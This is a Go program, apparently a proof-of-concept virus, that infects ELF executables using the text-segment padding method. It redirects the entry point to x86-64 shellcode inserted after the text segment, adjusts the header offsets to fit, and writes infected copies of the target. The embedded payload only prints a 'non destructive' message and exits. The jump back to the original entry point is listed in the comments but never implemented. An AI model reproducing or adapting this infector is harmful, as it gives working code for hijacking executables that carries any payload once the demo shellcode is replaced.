/*
- [1] Increase p_shoff by PAGE_SIZE in the ELF header
[2] Patch the insertion code (parasite) to jump to the entry point (original)
- [3] Locate the text segment program header
[4] Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
[5] Increase p_filesz by account for the new code (parasite)
[6] Increase p_memsz to account for the new code (parasite)
[7] For each phdr who's segment is after the insertion (text segment)
[8] increase p_offset by PAGE_SIZE
[9] For the last shdr in the text segment
[10] increase sh_len by the parasite length
[11] For each shdr who's section resides after the insertion
[12] Increase sh_offset by PAGE_SIZE
[13] Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
*/

package main

import (
	"io"
	"os"
	"fmt"
	"bytes"
	"debug/elf"
	"io/ioutil"
//	"encoding/gob"
//	"encoding/json"
	"encoding/binary"
)

const(
	SUCCESS int = 0
	FAILURE int = 1
	x64_PAGE_SIZE uint64 = 4096 //
	x86_PAGE_SIZE int = 4096
	PAGE_SIZE int = 4096
)

var payload64 = []byte {
	0xeb, 0x22,       					//jmp message
	0x48, 0x31, 0xc0, 					//xor rax, rax
	0x48, 0x31, 0xff,					//xor rdi, rdi
	0xb8, 0x01, 0x00, 0x00, 0x00,		//mov eax, 0x1
	0xbf, 0x01, 0x00, 0x00, 0x00,       //mov edi, 0x1
	0x5e,								//pop rsi
	0xba, 0x2a, 0x00, 0x00, 0x00,		//mov edx, 0x2a
	0x0f, 0x05,							//syscall
	0x48, 0x31, 0xff,					//xor rdi, rdi
	0x48, 0x31, 0xc0,					//xor rax, rax
	0xb0, 0x3c,							//mov al, 0x3c
	0x0f, 05,         					//syscall	
	0xe8, 0xd9, 0xff, 0xff, 0xff,       //call <shellcode>
	0x68, 0x65, 0x6c, 0x6c, 0x6f,   	// "hello - this is a non destructive payload"
	0x20, 0x2d, 0x2d, 0x20, 0x74, 0x68,
	0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61,
	0x20, 0x6e, 0x6f,
	0x6e,
	0x20, 0x64, 0x65, 0x73,
	0x74, 0x72,
	0x75, 0x63,
	0x74, 0x69,
	0x76, 0x65,
	0x20, 0x70, 0x61,
	0x79, 0x6c,
	0x6f,
	0x61,
	0x64,
	0x0a,

}

var dummypayload = []byte{0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44}
func isElf(magic []byte) bool {
	return !(magic[0] != '\x7f' || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F')
}

func checkError(e error) {
	if e != nil {
		panic(e)
	}
}

func usage() {
	fmt.Println("Usage: ", os.Args[0], "<target_file>")
	os.Exit(FAILURE)
}

func main() {
	if len(os.Args) < 2{
		usage()
	}
	var debug bool  = true

	origFile := os.Args[1]

	origFileHandle, err := os.Open(origFile)
	checkError(err)
	defer origFileHandle.Close()
	
	var magic [4]byte
	origFileHandle.Read(magic[:])
	
	if ! isElf(magic[:4]) {
		fmt.Println("This is not an Elf binary")
		os.Exit(FAILURE)
	} 
	
	fStat, err := origFileHandle.Stat()
	checkError(err)
	
	// oSize := fStat.Size()

	origFileBuf := make([]byte, fStat.Size())
	origFileHandle.Seek(0, io.SeekStart)
	origFileHandle.Read(origFileBuf[:])
	
	origFileReader := bytes.NewReader(origFileBuf)
	
	var elfHeader elf.Header64
	binary.Read(origFileReader, binary.LittleEndian, &elfHeader)	

	//save the original entry point of the program and old offset of section hdr table
	var oEntry uint64
	var oShoff uint64
	oEntry = elfHeader.Entry
	oShoff = elfHeader.Shoff
	//[1] increase the e_shoff by PAGESIZE
	elfHeader.Shoff += x64_PAGE_SIZE
	
	//[3]locate program header table
	pHeaders := make([]elf.Prog64, elfHeader.Phnum)
	phSectionReader := io.NewSectionReader(origFileReader, int64(elfHeader.Phoff), int64(elfHeader.Phentsize * elfHeader.Phnum))
	binary.Read(phSectionReader, binary.LittleEndian, pHeaders)
	
	/*
		Need to save the index of the .text segment when you find it.
		That way you can adjust the Memsz and Filesz by PAGESIZE
	*/
	
	var textNdx int
	var textSegEnd uint64
	for i := 0; i < int(elfHeader.Phnum); i++ {
		if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
			//fmt.Printf("text segment offset @ 0x%x and is %d/%d", pHeaders[i].Off, i, elfHeader.Phnum)
			textNdx = i
			//[4]
			elfHeader.Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
			if debug {
				fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry, elfHeader.Entry)
			}
			//[5] && [6]
			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
			fmt.Printf("text segment ends @ 0x%x\n", textSegEnd)
			pHeaders[i].Memsz += uint64(len(payload64))
			pHeaders[i].Filesz += uint64(len(payload64))
			if debug {
				fmt.Printf("[+] Increasing text segment p_filesz and p_memsz by %d (length of payload)\n", len(payload64))
			}
		}
	}

	//Adjust the file offsets of each segment program header after the text segment program header
	if debug {
		fmt.Println("[+] Adjusting segments after text segment file offsets by 0x2000")
	}
    // [7] && [8]
	for j := textNdx; j < int(elfHeader.Phnum); j++{
		if pHeaders[textNdx].Off < pHeaders[j].Off {
			if debug{
				fmt.Println("Inceasing pHeader @ index ", j, "by 0x1000");
			}
			pHeaders[j].Off += x64_PAGE_SIZE
		}
	}

	// Elf header and program header table are adjacent to each other in the file
	infectedBuf := new(bytes.Buffer)
	binary.Write(infectedBuf, binary.LittleEndian, &elfHeader)
	binary.Write(infectedBuf, binary.LittleEndian, pHeaders)

	ephdrsz := int(elfHeader.Ehsize) + int(elfHeader.Phentsize * elfHeader.Phnum)
	binary.Write(infectedBuf, binary.LittleEndian, origFileBuf[ephdrsz:])

	//section header table comes after the data segment, we'll need a section reader
	infectedReader := bytes.NewReader(infectedBuf.Bytes())
	sectionTableReader := io.NewSectionReader(infectedReader, int64(oShoff), int64(elfHeader.Shentsize * elfHeader.Shnum))

	sectionHdrTable := make([]elf.Section64, elfHeader.Shnum)
	binary.Read(sectionTableReader, binary.LittleEndian, sectionHdrTable)

	if debug {
		fmt.Println("[+] Increasing section header addresses if they come after text segment")
	}

	for k := 0; k < int(elfHeader.Shnum); k++ {
		if sectionHdrTable[k].Off >= textSegEnd {
			if debug{
				fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr);
			}
			sectionHdrTable[k].Off += x64_PAGE_SIZE
			//elfHeader.Entry here was previously adjust to be start of parasite
		}else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
				if debug{
				fmt.Println("[+] Extending section size of sectionhdr associated with text segment");
				}
				sectionHdrTable[k].Size += uint64(len(payload64))
		}
	}
	/*for k := 0; k < int(elfHeader.Shnum); k++ {
		if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
			if debug{
				fmt.Println("[+] Extending section size of sectionhdr associated with text segment");
			}
			sectionHdrTable[k].Size += uint64(len(payload64))
		}
	}*/
	//sectionHeaderTableBytes := make([]byte, int(elfHeader.Shnum) * int(elfHeader.Shentsize))
	//fmt.Println("Allocated sectionHeaderTableBytes => ", len(sectionHeaderTableBytes));
	//infectedShdrTable := bytes.NewBuffer(sectionHeaderTableBytes);
	infectedShdrTable := new(bytes.Buffer)
	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable) 
    
	//sHdrTableLen := int(elfHeader.Shentsize * elfHeader.Shnum)
	//fmt.Println("section hdr table len => ", sHdrTableLen);
	//fmt.Println("calc section hdr table len =>", elfHeader.Shentsize * elfHeader.Shnum);
	
	finalInfectionTwo := make([]byte, infectedBuf.Len() + int(PAGE_SIZE));
	fmt.Println("Infected buf len  => ", infectedBuf.Len())
	finalInfection := infectedBuf.Bytes()
	/*var readErr error
	for l :=0; l < sHdrTableLen; l++ {
		finalInfection[int(oShoff) + l], readErr = infectedShdrTable.ReadByte()
		checkError(readErr)
		//fmt.Println("Index => ", l);
	}
	*/
	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
	/*
	for m := 0; m < len(payload64); m++ {
		if debug{
			fmt.Println("[+] writing payload into the binary")
		}
		finalInfection[textSegEnd + uint64(m)] = payload64[m]
	}
	*/
	//end_of_infection :=  int(pHeaders[textNdx].Off + pHeaders[textNdx].Filesz)
	end_of_infection := int(textSegEnd)
	fmt.Printf("end_of_infection @ 0x%x\n", end_of_infection)
	copy(finalInfectionTwo, finalInfection[:end_of_infection])
	if debug{
			fmt.Println("[+] writing payload into the binary")
	}
	copy(finalInfectionTwo[end_of_infection:], payload64)
	copy(finalInfectionTwo[end_of_infection + PAGE_SIZE:], finalInfection[end_of_infection:])
	infectedFileName := fmt.Sprintf("%s-copy", origFile)
	infectedFileNameTwo := fmt.Sprintf("%s-copy-test", origFile)

	err = ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751)
	checkError(err)

	ioutil.WriteFile(infectedFileNameTwo, finalInfection, 0751)
	fmt.Println("finalInfectionTwo cap => ", cap(finalInfectionTwo), "finalInfectionTwo len => ", len(finalInfectionTwo))

}




